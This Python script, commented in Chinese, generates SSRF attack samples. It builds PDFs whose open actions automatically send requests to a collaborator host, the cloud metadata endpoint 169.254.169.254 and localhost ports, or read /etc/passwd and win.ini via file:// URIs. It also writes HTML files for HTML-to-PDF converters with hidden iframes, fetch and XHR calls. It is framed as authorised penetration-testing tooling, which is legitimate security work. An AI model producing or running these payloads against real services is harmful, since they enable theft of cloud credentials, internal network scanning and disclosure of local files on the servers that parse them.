"""
PDF SSRF 测试样本生成器（仅供授权安全测试使用）
优化点：
1. 底层直接构造PDF结构，无第三方依赖
2. 覆盖5种SSRF触发场景
3. 包含服务端HTML转PDF专用测试样本
"""
import os

# 输出目录
OUT_DIR = "ssrf_samples"
os.makedirs(OUT_DIR, exist_ok=True)


# ---------------------------------------------------------------
# 通用底层PDF构造器
# ---------------------------------------------------------------
class PDFBuilder:
    def __init__(self):
        self.objects = {}
        self.order = []

    def add_object(self, obj_id: int, body: bytes):
        self.objects[obj_id] = body
        self.order.append(obj_id)

    def build(self) -> bytes:
        out = bytearray()
        out += b"%PDF-1.7\n%\xe2\xe3\xcf\xd3\n"
        offsets = {}

        for oid in self.order:
            offsets[oid] = len(out)
            out += f"{oid} 0 obj\n".encode()
            out += self.objects[oid]
            if not self.objects[oid].endswith(b"\n"):
                out += b"\n"
            out += b"endobj\n"

        xref_pos = len(out)
        max_obj_id = max(self.objects.keys())
        out += f"xref\n0 {max_obj_id + 1}\n".encode()
        out += b"0000000000 65535 f \n"
        for i in range(1, max_obj_id + 1):
            if i in offsets:
                out += f"{offsets[i]:010d} 00000 n \n".encode()
            else:
                out += b"0000000000 00000 f \n"

        out += f"trailer\n<< /Size {max_obj_id + 1} /Root 1 0 R >>\n".encode()
        out += f"startxref\n{xref_pos}\n%%EOF\n".encode()
        return bytes(out)


# ---------------------------------------------------------------
# SSRF样本1：SubmitForm自动POST请求（表单提交场景）
# ---------------------------------------------------------------
def gen_ssrf_submitform(filename: str, target_url: str):
    """打开PDF自动提交表单到目标地址，支持POST请求"""
    pdf = PDFBuilder()
    pdf.add_object(1, b"<< /Type /Catalog /Pages 2 0 R /OpenAction 4 0 R >>")
    pdf.add_object(2, b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>")
    pdf.add_object(3, b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>")
    # 表单提交动作，自动POST到目标URL
    submit_action = (
        b"<< /Type /Action /S /SubmitForm "
        b"/F << /FS /URL /F (" + target_url.encode() + b") >> "
        b"/Flags 0 >>"
    )
    pdf.add_object(4, submit_action)
    
    with open(os.path.join(OUT_DIR, filename), "wb") as f:
        f.write(pdf.build())
    print(f"✅ 已生成: {filename} | 场景: 自动POST表单提交")


# ---------------------------------------------------------------
# SSRF样本2：GoToR远程引用（远程PDF加载场景）
# ---------------------------------------------------------------
def gen_ssrf_gotor(filename: str, target_url: str):
    """诱导PDF阅读器加载远程PDF文件，触发GET请求"""
    pdf = PDFBuilder()
    pdf.add_object(1, b"<< /Type /Catalog /Pages 2 0 R /OpenAction 4 0 R >>")
    pdf.add_object(2, b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>")
    pdf.add_object(3, b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>")
    # 远程PDF引用动作
    gotor_action = (
        b"<< /Type /Action /S /GoToR "
        b"/F (" + target_url.encode() + b") /D [0 /Fit] >>"
    )
    pdf.add_object(4, gotor_action)
    
    with open(os.path.join(OUT_DIR, filename), "wb") as f:
        f.write(pdf.build())
    print(f"✅ 已生成: {filename} | 场景: 远程PDF引用加载")


# ---------------------------------------------------------------
# SSRF样本3：URI注释+OpenAction双触发（覆盖更多解析器）
# ---------------------------------------------------------------
def gen_ssrf_uri_dual_trigger(filename: str, target_url: str):
    """同时在注释和OpenAction中嵌入URI，覆盖不同解析逻辑的后端"""
    pdf = PDFBuilder()
    pdf.add_object(1, b"<< /Type /Catalog /Pages 2 0 R /OpenAction 5 0 R >>")
    pdf.add_object(2, b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>")
    # 页面中嵌入全屏隐藏链接注释
    pdf.add_object(3,
        b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] "
        b"/Annots [4 0 R] >>")
    pdf.add_object(4,
        b"<< /Type /Annot /Subtype /Link /Rect [0 0 612 792] "
        b"/A << /Type /Action /S /URI /URI (" + target_url.encode() + b") >> >>")
    # OpenAction直接发起URI请求
    pdf.add_object(5,
        b"<< /Type /Action /S /URI /URI (" + target_url.encode() + b") >>")
    
    with open(os.path.join(OUT_DIR, filename), "wb") as f:
        f.write(pdf.build())
    print(f"✅ 已生成: {filename} | 场景: 注释+OpenAction双触发")


# ---------------------------------------------------------------
# SSRF样本4：file协议本地文件读取（针对支持file协议的解析器）
# ---------------------------------------------------------------
def gen_ssrf_file_read(filename: str, file_path: str):
    """测试服务端是否支持file协议读取本地敏感文件"""
    pdf = PDFBuilder()
    pdf.add_object(1, b"<< /Type /Catalog /Pages 2 0 R /OpenAction 4 0 R >>")
    pdf.add_object(2, b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>")
    pdf.add_object(3, b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>")
    # file协议URI
    pdf.add_object(4, f"<< /Type /Action /S /URI /URI (file://{file_path}) >>".encode())
    
    with open(os.path.join(OUT_DIR, filename), "wb") as f:
        f.write(pdf.build())
    print(f"✅ 已生成: {filename} | 场景: file协议本地文件读取")


# ---------------------------------------------------------------
# SSRF样本5：HTML转PDF专用测试样本（针对wkhtmltopdf/Puppeteer等）
# ---------------------------------------------------------------
def gen_html2pdf_ssrf(filename: str, target_url: str):
    """生成HTML文件，用于测试HTML转PDF接口的SSRF漏洞"""
    html_content = f"""<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>HTML2PDF SSRF Test</title>
</head>
<body>
    <h1>HTML to PDF SSRF 测试样本</h1>
    
    <!-- 多维度触发资源加载 -->
    <img src="{target_url}/img" alt="ssrf-img">
    <iframe src="{target_url}/iframe" width="0" height="0"></iframe>
    <link rel="stylesheet" href="{target_url}/css">
    <script src="{target_url}/js"></script>
    
    <!-- CSS触发 -->
    <style>
        @import url("{target_url}/import.css");
        body {{ background: url("{target_url}/bg"); }}
    </style>
    
    <!-- JS主动请求（针对Headless Chrome） -->
    <script>
        // Fetch请求
        fetch("{target_url}/fetch").catch(e=>{{}});
        // XHR请求
        var xhr = new XMLHttpRequest();
        xhr.open("GET", "{target_url}/xhr", false);
        try {{ xhr.send(); }} catch(e){{}}
    </script>
    
    <!-- 本地文件读取测试 -->
    <iframe src="file:///etc/passwd" width="0" height="0"></iframe>
    <iframe src="file:///C:/Windows/win.ini" width="0" height="0"></iframe>
</body>
</html>"""
    
    with open(os.path.join(OUT_DIR, filename), "w", encoding="utf-8") as f:
        f.write(html_content)
    print(f"✅ 已生成: {filename} | 场景: HTML转PDF服务端SSRF")


# ---------------------------------------------------------------
# 主入口
# ---------------------------------------------------------------
if __name__ == "__main__":
    # 替换为你的测试目标地址
    OOB_SERVER = "http://your-collab-address.com"
    CLOUD_METADATA = "http://169.254.169.254/latest/meta-data/"
    INTERNAL_TEST = "http://127.0.0.1:8080"

    print("="*50)
    print("📦 开始生成PDF SSRF测试样本...")
    print("="*50)
    
    # 通用SSRF样本
    gen_ssrf_submitform("01_ssrf_submitform_post.pdf", f"{OOB_SERVER}/submit")
    gen_ssrf_gotor("02_ssrf_gotor_remote.pdf", f"{OOB_SERVER}/remote")
    gen_ssrf_uri_dual_trigger("03_ssrf_uri_dual_trigger.pdf", f"{OOB_SERVER}/dual")
    
    # 云环境/内网测试样本
    gen_ssrf_uri_dual_trigger("04_ssrf_cloud_metadata.pdf", CLOUD_METADATA)
    gen_ssrf_uri_dual_trigger("05_ssrf_internal_port.pdf", INTERNAL_TEST)
    
    # 本地文件读取样本
    gen_ssrf_file_read("06_ssrf_file_linux.pdf", "/etc/passwd")
    gen_ssrf_file_read("07_ssrf_file_windows.pdf", "C:/Windows/win.ini")
    
    # HTML转PDF样本
    gen_html2pdf_ssrf("08_html2pdf_ssrf_cloud.html", CLOUD_METADATA)
    gen_html2pdf_ssrf("09_html2pdf_ssrf_internal.html", INTERNAL_TEST)

    print("\n" + "="*50)
    print(f"📂 所有样本已输出到: ./{OUT_DIR}/")
    print("⚠️  仅用于授权安全测试，禁止非法使用！")
    print("="*50)
